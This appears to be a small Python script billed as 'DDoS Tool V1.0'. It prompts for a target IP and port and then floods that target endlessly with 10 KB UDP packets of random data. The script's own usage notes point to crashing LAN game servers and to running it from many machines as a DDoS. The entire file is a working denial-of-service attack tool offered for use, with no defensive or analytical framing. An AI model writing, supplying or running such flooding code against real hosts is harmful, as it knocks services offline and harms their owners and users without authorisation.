import socket
import os

banner = """         _   _             _        
     /\  | | | |           | |       | | |
    /  \ | |_| |_ __ _  ___| | __    | | |
   / /\ \| __| __/ _` |/ __| |/ /    | | |
  / ____ \ |_| || (_| | (__|   <     | | |
 /_/    \_\__|\__\__,_|\___|_|\_\    . . .
"""

class main():
    print(banner)
    print("===== DDoS Tool V1.0 =====\n1.This program requires Target's IPv4 and does not have a Firewall.\n2.This program sends data on the UDP protocol.\n3.If you do it on one computer, it's called DoS.\n4.If you do it on multiple computers, it's called DDoS.\n5.You can cause the local game server (LAN) to crash by DDoS on the game server host.\n\n **DDoS affects your internet bandwidth.**\n\n")
    
    # Defind Ojb
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


    # Input
    host = str(input("Enter Target IP : "))
    port = int(input("Enter Port to Attack : "))

    # สร้าง Data
    byte = os.urandom(10240)

    # นับ Packet
    sent = 1

    # Working
    while True:
        s.sendto(byte, (host, port))

        print("Sending ", sent, "To", host, "with port", port)
        sent = sent + 1

if __name__ == "__main__":
    main()